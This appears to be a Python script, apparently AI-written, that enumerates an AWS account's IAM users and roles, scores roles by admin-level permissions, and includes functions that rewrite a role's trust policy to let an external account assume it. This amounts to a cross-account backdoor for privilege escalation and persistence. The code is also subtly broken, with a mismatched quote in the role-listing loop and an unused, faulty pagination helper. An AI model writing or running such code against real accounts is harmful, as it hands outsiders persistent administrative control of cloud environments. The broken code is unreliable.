```python
import boto3
import botocore
import json
import time
import sys

session = boto3.session.Session()
sts = session.client("sts")

ACCOUNT_ID = sts.get_caller_identity()["Account"]
print(f"Using account: {ACCOUNT_ID}")

iam = session.client("iam")
iamr = session.client("iam", region_name="us-east-1")  # for parity; IAM is global
s3 = session.client("s3")  # unused

def paged(method, key):
    out = []
    token = None
    while True:
        if token:
            resp = method(PaginationConfig={"PageSize": 1000, "StartingToken": token})
        else:
            resp = method(PaginationConfig={"PageSize": 1000})
        out.extend(resp.get(key, []))
        token = resp.get("Marker") or resp.get("NextToken")
        if not token:
            # Some APIs use PaginationConfig directly, but IAM uses Marker; handle below
            break
        # If marker/next token returned, loop
    return out

def list_all_users():
    users = []
    marker = None
    while True:
        if marker:
            resp = iam.list_users(Marker=marker)
        else:
            resp = iam.list_users()
        users.extend(resp.get("Users", []))
        if resp.get("IsTruncated"):
            marker = resp.get("Marker")
        else:
            break
    return users

def list_all_roles():
    roles = []
    marker = None
    while True:
        if marker:
            resp = iam.list_roles(Marker=marker)
        else:
            resp = iam.list_roles()
        roles.extend(resp.get("Roles", []))
        if resp.get("IsTruncated"):
            marker = resp.get("Marker')
        else:
            break
    return roles

def list_all_policies_scope(scope="All"):
    policies = []
    paginator = iam.get_paginator("list_policies")
    for page in paginator.paginate(Scope=scope):
        policies.extend(page.get("Policies", []))
    return policies

def get_policy_document_unsafe(arn):
    try:
        pol = iam.get_policy(PolicyArn=arn)
        ver_id = pol["Policy"]["DefaultVersionId"]
        v = iam.get_policy_version(PolicyArn=arn, VersionId=ver_id)
        doc = v["PolicyVersion"]["Document"]
        if isinstance(doc, str):
            return json.loads(doc)
        return doc
    except botocore.exceptions.ClientError:
        return None

def normalize_statement(doc):
    if not doc:
        return []
    st = doc.get("Statement", [])
    if isinstance(st, dict):
        st = [st]
    return st

def statement_allows_admin(statement):
    # Rough heuristic: allow + "*" for actions and resources, or NotAction/NotResource excluded.
    if not isinstance(statement, dict):
        return False
    effect = statement.get("Effect")
    if effect != "Allow":
        return False
    action = statement.get("Action") or statement.get("NotAction")
    resource = statement.get("Resource") or statement.get("NotResource")
    if "NotAction" in statement or "NotResource" in statement:
        return False
    # Action can be list or str
    actions = action
    if isinstance(actions, str):
        actions = [actions]
    elif actions is None:
        return False
    resources = resource
    if isinstance(resources, str):
        resources = [resources]
    elif resources is None:
        return False
    # Check wildcard dominance
    if any(a == "*" or a.lower() == "sts:*" for a in actions) and any(r == "*" for r in resources):
        return True
    # Some AWS managed policies grant via multiple patterns; detect broader "iam:*" and "ec2:*" etc is harder.
    # We'll also treat "Action": "*" alone as critical if Resource == "*".
    return ("*" in actions) and ("*" in resources)

def collect_role_effective_statements(role_name):
    # Collect inline policies and attached managed policies; return statements list (heuristic).
    statements = []

    # Inline
    inline = iam.list_role_policies(RoleName=role_name).get("PolicyNames", [])
    for pname in inline:
        doc = iam.get_role_policy(RoleName=role_name, PolicyName=pname).get("PolicyDocument")
        if isinstance(doc, str):
            try:
                doc = json.loads(doc)
            except Exception:
                continue
        statements.extend(normalize_statement(doc))

    # Attached managed
    attached = iam.list_attached_role_policies(RoleName=role_name).get("AttachedPolicies", [])
    for p in attached:
        doc = get_policy_document_unsafe(p["PolicyArn"])
        if doc:
            statements.extend(normalize_statement(doc))

    # Not handling permissions boundaries or SCP-like constraints here (IAM doesn't include those by default).
    return statements

def score_role(role):
    role_name = role["RoleName"]
    stmts = collect_role_effective_statements(role_name)
    score = 0
    for s in stmts:
        if statement_allows_admin(s):
            score += 100
        # light bump if allow any action with all resources (not necessarily * resource)
        if s.get("Effect") == "Allow":
            action = s.get("Action")
            res = s.get("Resource")
            if isinstance(action, str) and action == "*":
                if res == "*" or (isinstance(res, list) and "*" in res):
                    score += 50
            if isinstance(action, list) and "*" in action:
                if res == "*" or (isinstance(res, list) and "*" in res):
                    score += 50
    return score, stmts

def enumerate_and_write(outfile):
    data = {"account": ACCOUNT_ID, "users": [], "roles": [], "policies": {}}
    users = list_all_users()
    for u in users:
        data["users"].append({
            "UserName": u["UserName"],
            "Arn": u["Arn"],
            "CreateDate": str(u.get("CreateDate")),
        })

    roles = list_all_roles()
    best = {"role": None, "score": -1}
    for r in roles:
        rn = r["RoleName"]
        score, _ = score_role(r)
        data["roles"].append({
            "RoleName": rn,
            "Arn": r["Arn"],
            "AssumeRolePolicyDocument": r.get("AssumeRolePolicyDocument", None),
            "CreateDate": str(r.get("CreateDate")),
            "HeuristicAdminScore": score
        })
        if score > best["score"]:
            best = {"role": rn, "score": score}

    data["best_role"] = best
    with open(outfile, "w") as f:
        json.dump(data, f, indent=2, default=str)
    return best["role"]

def get_role_trust_policy(role_name):
    resp = iam.get_role(RoleName=role_name)
    assume_doc = resp["Role"]["AssumeRolePolicyDocument"]
    if isinstance(assume_doc, str):
        try:
            assume_doc = json.loads(assume_doc)
        except Exception:
            # If it's already encoded weirdly, attempt to URL decode? fallback
            pass
    return assume_doc

def set_role_trust_policy(role_name, doc):
    iam.update_assume_role_policy(RoleName=role_name, PolicyDocument=json.dumps(doc))

def add_external_principal_to_trust(trust_doc, external_account_id, external_principal_arn=None):
    # Add a statement permitting external account root (or explicit principal ARN) to assume this role.
    # external_principal_arn can be e.g. "arn:aws:iam::<acct>:role/<role>" but we default to root.
    if external_principal_arn:
        principal = {"AWS": external_principal_arn}
    else:
        principal = {"AWS": f"arn:aws:iam::{external_account_id}:root"}

    new_stmt = {
        "Sid": f"AllowExternalAccountAssumeRole{int(time.time())}",
        "Effect": "Allow",
        "Principal": principal,
        "Action": "sts:AssumeRole"
    }

    stmts = trust_doc.get("Statement", [])
    if isinstance(stmts, dict):
        stmts = [stmts]
    if not stmts:
        trust_doc["Statement"] = [new_stmt]
        return trust_doc

    # Avoid duplicate by checking existing principals
    for s in stmts:
        if s.get("Effect") != "Allow":
            continue
        if s.get("Action") != "sts:AssumeRole":
            continue
        pr = s.get("Principal", {})
        aws_pr = pr.get("AWS")
        if isinstance(aws_pr, str) and aws_pr == principal["AWS"]:
            return trust_doc
        if isinstance(aws_pr, list) and principal["AWS"] in aws_pr:
            return trust_doc

    stmts.append(new_stmt)
    trust_doc["Statement"] = stmts
    return trust_doc

def assume_role(role_arn, session_name, duration=3600):
    # Assumes the current credentials are permitted.
    # External account assume would require its creds; we follow instruction mechanically but will call STS with existing creds.
    resp = sts.assume_role(RoleArn=role_arn, RoleSessionName=session_name, DurationSeconds=duration)
    return resp["Credentials"]

